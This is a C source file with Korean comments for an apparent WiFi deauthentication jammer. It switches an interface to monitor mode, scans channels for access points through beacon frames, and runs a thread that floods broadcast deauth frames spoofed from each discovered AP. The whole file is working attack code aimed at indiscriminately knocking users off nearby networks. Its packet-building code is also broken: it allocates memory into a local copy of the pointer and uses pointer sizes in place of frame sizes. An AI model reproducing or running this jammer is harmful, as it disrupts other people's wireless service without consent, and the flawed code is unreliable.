#include "wifi.h"
int g_wifi_end_signal = 0;

void clear_scr()
{
	printf("\033[2J\033[1;1H");
	fflush(stdout);
}

void iw_init_dev(struct iw_dev *dev) {
	memset(dev, 0, sizeof(*dev));
	dev->fd_in = -1;
	dev->fd_out = -1;
}

int iw_dev_set(struct iw_dev *dev)
{  
    struct ifreq ifr;
	struct iwreq iwr;
	struct sockaddr_ll sll;
	struct packet_mreq mreq;
    int fd;

	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))<0)
    {
        perror("socket ");
        return -1;
    }
    dev->fd_in = fd;

	if((dev->fd_out = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))<0)
    {
        perror("socket ");
        return -1;
    }

	/* 인퍼페이스 플래그 저장 */
	memset(&dev->old_flags, 0, sizeof(dev->old_flags));
	strncpy(dev->old_flags.ifr_name, dev->ifname, sizeof(dev->old_flags.ifr_name)-1);
	if (ioctl(fd, SIOCGIFFLAGS, &dev->old_flags) < 0)
    {
		dev->old_flags.ifr_name[0] = '\0';
		perror("ioctl(SIOCGIFFLAGS)" );
        return -1;
	}

	/* 인터페이스 모드 저장 */
	memset(&dev->old_mode, 0, sizeof(dev->old_mode));
	strncpy(dev->old_mode.ifr_name, dev->ifname, sizeof(dev->old_mode.ifr_name)-1);
	if (ioctl(fd, SIOCGIWMODE, &dev->old_mode) < 0)
    {
		dev->old_mode.ifr_name[0] = '\0';
		perror("ioctl(SIOCGIWMODE) ");
        return -1;
	}

	/* 인터페이스 down (ifr_flags = 0) */
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev->ifname, sizeof(ifr.ifr_name)-1);
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
    {
		perror("ioctl(SIOCSIFFLAGS) ");
        return -1;
    }

	/* 인터페이스 모드 변경 (모니터모드) */
	memset(&iwr, 0, sizeof(iwr));
	strncpy(iwr.ifr_name, dev->ifname, sizeof(iwr.ifr_name)-1);
	iwr.u.mode = IW_MODE_MONITOR;
	if (ioctl(fd, SIOCSIWMODE, &iwr) < 0)
    {
        perror("ioctl(SIOCSIWMODE) ");
        return -1;
    }	

	/* 인터페이스 up, broadcast and running */
	ifr.ifr_flags = IFF_UP | IFF_BROADCAST | IFF_RUNNING;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
    {
        perror("ioctl(SIOCSIFFLAGS) ");
        return -1;
    }
		
	/* 인터페이스 index 얻어오기 */
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
    {
        perror("ioctl(SIOCGIFINDEX) ");
        return -1;
    }		
	dev->ifindex = ifr.ifr_ifindex;

	/* fd_in socket binding */
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = dev->ifindex;
	sll.sll_protocol = htons(ETH_P_ALL);
	if (bind(dev->fd_in, (struct sockaddr*)&sll, sizeof(sll)) < 0)
    {
        perror("bind ");
        return -1;
    }

	/* fd_out socket binding */
	if (bind(dev->fd_out, (struct sockaddr*)&sll, sizeof(sll)) < 0)
    {
        perror("bind ");
        return -1;
    }
		
	shutdown(dev->fd_in, SHUT_WR);
	shutdown(dev->fd_out, SHUT_RD);

	/* fd_in socket 무차별 모드 */
	memset(&mreq, 0, sizeof(mreq));
	mreq.mr_ifindex = dev->ifindex;
	mreq.mr_type = PACKET_MR_PROMISC;
	if (setsockopt(dev->fd_in, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mreq, sizeof(mreq)) < 0)
    {
        perror("setsockopt(PACKET_MR_PROMISC) ");
        return -1;
    }
		
	return 0;
}

void iw_dev_unset(struct iw_dev *dev)
{
	struct ifreq ifr;

	if (dev->fd_in == -1)
		return;

	if (dev->fd_out == -1)
	{
		close(dev->fd_in);
		return;
	}

	if (dev->old_flags.ifr_name[0] != '\0') {
		/* set interface down (ifr_flags = 0) */
		memset(&ifr, 0, sizeof(ifr));
		strncpy(ifr.ifr_name, dev->ifname, sizeof(ifr.ifr_name)-1);
		ioctl(dev->fd_in, SIOCSIFFLAGS, &ifr);
		/* restore old mode */
		if (dev->old_mode.ifr_name[0] != '\0')
			ioctl(dev->fd_in, SIOCSIWMODE, &dev->old_mode);
		/* restore old flags */
		ioctl(dev->fd_in, SIOCSIFFLAGS, &dev->old_flags);
	}

	close(dev->fd_in);
	close(dev->fd_out);
}


int get_ap_info(struct iw_dev *dev, struct ap_info *api)
{
	uint8_t buf[4096], *pkt;
	size_t pkt_sz;
	ssize_t r, tmp, n;
	uint64_t tmp_size;
	struct radiotap_hdr *rt_hdr;
	struct mgmt_frame *beacon;
	struct beacon_frame_body *beacon_fb;
	struct info_element *beacon_ie;

	r = recv(dev->fd_in, buf, sizeof(buf), 0);
	if(r<0)
	{
		perror("recv ");
		return -1;
	}
	else if (r==0)
		return -1;
	
	rt_hdr = (struct radiotap_hdr *)buf;
	if (sizeof(*rt_hdr) >= r || rt_hdr->len >= r)
		return -1;
	
	pkt = buf + rt_hdr->len;
	pkt_sz = r - rt_hdr->len;

	if(pkt_sz < sizeof(*beacon) + sizeof(*beacon_fb))
		return -1;
	
	beacon = (struct mgmt_frame*)pkt;

	if(beacon->fc.type == FRAME_CONTROL_TYPE_MGMT_FRAME
		&& beacon->fc.subtype == FRAME_CONTROL_SUBTYPE_BEACON)
	{
		memcpy(api->bssid, beacon->bssid, IFHWADDRLEN);
		beacon_fb = (struct beacon_frame_body *)beacon->frame_body;
		beacon_ie = (struct info_element*)beacon_fb->infos;
		api->essid[0] = '\0';

		n = 0;

		/* parse beacon */
		while (1) 
		{
			tmp_size = (uint64_t)beacon_ie + sizeof(*beacon_ie);
			if (tmp_size - (uint64_t)buf >= r)
				break;
			tmp_size += beacon_ie->len;
			if (tmp_size - (uintptr_t)buf > r)
				break;
			if (beacon_ie->id == INFO_ELEMENT_ID_SSID) //SSID found
			{ 
				tmp = beacon_ie->len < ESSID_LEN ? beacon_ie->len : ESSID_LEN;
				memcpy(api->essid, beacon_ie->info, tmp);
				api->essid[tmp] = '\0';
				n |= 1;
			} 
			else if (beacon_ie->id == INFO_ELEMENT_ID_DS) //Channel found
			{
				if (beacon_ie->len != 1)
					break;
				api->chan = beacon_ie->info[0];
				n |= 2;
			}
			if (n == (1|2))
				break;
			/* next beacon element */
			beacon_ie = (struct info_element*)&beacon_ie->info[beacon_ie->len];
		}
		if(!(n & 2))
			return -1;
		return 0;
	}	
	return -1;
}

int add_ap(struct ap_list *apl, struct ap_info *api)
{
	struct access_point *ap = apl->head;

	while (ap != NULL) 
	{
		if (memcmp(ap->info.bssid, api->bssid, IFHWADDRLEN) == 0)
			break;
		ap = ap->next;
	}
	if (ap == NULL) {
		ap = malloc(sizeof(*ap));
		if (ap == NULL)
		{
			printf("malloc error\n");
			return -1;
		}
			
		memset(ap, 0, sizeof(*ap));
		memcpy(&ap->info, api, sizeof(ap->info));
		ap->last_beacon_tm = time(NULL);
		if (apl->head == NULL)
			apl->head = apl->tail = ap;
		else 
		{
			ap->prev = apl->tail;
			apl->tail->next = ap;
			apl->tail = ap;
		}
		
	} else
		ap->last_beacon_tm = time(NULL);

	return 0;
}

void free_ap_list(struct ap_list *apl)
{
	struct access_point *tmp;

	while (apl->head != NULL) {
		tmp = apl->head;
		apl->head = apl->head->next;
		free(tmp);
	}

	apl->head = apl->tail = NULL;
}

int iw_set_channel(struct iw_dev *dev, int chan)
{	
	struct iwreq iwr;

	/* set channel */

	memset(&iwr, 0, sizeof(iwr));
	strncpy(iwr.ifr_name, dev->ifname, sizeof(iwr.ifr_name)-1);
	
	iwr.u.freq.flags = IW_FREQ_FIXED;
	iwr.u.freq.m = chan;

	if (ioctl(dev->fd_in, SIOCSIWFREQ, &iwr) < 0)
    {
        perror("ioctl(SIOCSIWFREQ) ");
        return -1;
    }		
	dev->chan = chan;

	return 0;
}

void channel_set(uint32_t *cs, uint8_t chan) { cs[chan/32] |= 1 << (chan % 32);}
int channel_isset(uint32_t *cs, uint8_t chan) {return !!(cs[chan/32] & (1 << (chan % 32)));}

void make_deauth_packet(void *pack, struct iw_dev *dev, struct access_point *ap)
{
	struct deauth_packet *packet;
	uint16_t *reason;
	pack = malloc(sizeof(packet)+sizeof(*reason));
	memset(pack, 0 ,sizeof(packet) + sizeof(*reason));

	packet = (struct deauth_packet*)pack;
	packet->rt_hdr.len = sizeof(packet->rt_hdr) + sizeof(packet->w_rt_data);
	packet->rt_hdr.present = RADIOTAP_F_PRESENT_RATE | RADIOTAP_F_PRESENT_TX_FLAGS;

	packet->w_rt_data.rate = 2;
	packet->w_rt_data.tx_flags = RADIOTAP_F_TX_FLAGS_NOACK | RADIOTAP_F_TX_FLAGS_NOSEQ;

	packet->deauth.fc.subtype = FRAME_CONTROL_SUBTYPE_DEAUTH;
	
	memset(packet->deauth.dest_mac, '\xff', IFHWADDRLEN);
	memcpy(packet->deauth.src_mac, ap->info.bssid, IFHWADDRLEN);
	memcpy(packet->deauth.bssid, ap->info.bssid, IFHWADDRLEN);
	reason = (uint16_t*)(packet->deauth.frame_body);

	*reason = 7; 

	packet->deauth.sc.sequence = ap->sequence++;
}

int send_deauth(struct iw_dev *dev, struct access_point *ap)
{
	struct deauth_packet *deauth;
	void *pack;
	int r;

	make_deauth_packet(pack, dev, ap);
	deauth = (struct deauth_packet *)pack;

	/* send deauth */

	ap->sequence %= 4096;
	do {
		r = send(dev->fd_out, pack, sizeof(*pack), 0);
		if(r < 0)
		{
			perror("send ");
			free(pack);
			return -1;
		}
		else if (r > 0)
		{
			r -= deauth->rt_hdr.len;
			if (r <= 0)
				r = 0;
		}
	} while (r == 0);

	free(pack);

	return 0;
}

void INThandler(int sig)
{
    signal(sig, SIG_IGN);

    g_wifi_end_signal = 1;
}

void *deauth_thread(void *arg)
{
	struct deauth_thread_args *ta = arg;
	struct access_point *ap, *tmp;
	
	while (!g_wifi_end_signal)
	{
		ap = ta->apl->head;
		while(ap != NULL && !g_wifi_end_signal)
		{
			send_deauth(ta->dev, ap);
			ap = ap->next;
		}
	}
	return NULL;
}

int main(int argc, char ** argv)
{
    char * ifname = argv[1];
    struct iw_dev dev;
    struct ap_info api;
	struct ap_list apl;
	time_t tm, s_tm, e_tm;
	uint32_t chans[8]={0,};
	int n, ret, chan;
	pthread_t thread_id;
	struct deauth_thread_args ta;
	pthread_mutex_t list_mutex;
	
	for (n = 1; n<=13; n++)
		channel_set(chans,n);
	for (n = 36; n<=64; n+=4)
		channel_set(chans,n);
	for (n = 100; n<=140; n+=4)
		channel_set(chans,n);
	for (n = 149; n<=161; n+=4)
		channel_set(chans,n);
	channel_set(chans,165);

    iw_init_dev(&dev);
	strncpy(dev.ifname, ifname, sizeof(dev.ifname)-1);
    if(iw_dev_set(&dev)<0)
        return -1;
	
	chan = 0;
	n = 0;
	do 
	{
		chan = (chan % CHANNEL_MAX) + 1;
		if (channel_isset(chans, chan))
			ret = iw_set_channel(&dev, chan);
		else
			ret = -1;
		/* if fails try next channel */
	} while(++n < CHANNEL_MAX && ret < 0);
	if (ret < 0)
	{
		printf("chan error");
		return -1;
	}
	
	memset(&api, 0, sizeof(api));
	memset(&apl, 0, sizeof(apl));

	ta.apl = &apl;
	ta.dev = &dev;

	pthread_mutex_init(&list_mutex, NULL);
	ta.list_mutex = &list_mutex;

	pthread_create(&thread_id, NULL, deauth_thread, &ta);

	tm = time(NULL);

	signal(SIGINT, INThandler);

	while(!g_wifi_end_signal)
	{
		if(get_ap_info(&dev, &api)==-1) continue;

		pthread_mutex_lock(&list_mutex);
		add_ap(&apl, &api);
		pthread_mutex_unlock(&list_mutex);

		n = 0;
		if(time(NULL)-tm >= 1)
		{
			do 
			{
				chan = (chan % CHANNEL_MAX) + 1;
				if (channel_isset(chans, chan))
					ret = iw_set_channel(&dev, chan);
				else
					ret = -1;
				/* if fails try next channel */
			} while(++n < CHANNEL_MAX && ret < 0);
			if (ret < 0) 
			{
				printf("error");
				return -1;
			}
		}
	}

	pthread_join(thread_id, NULL);
	iw_dev_unset(&dev);
	free_ap_list(&apl);

    return 0;
}
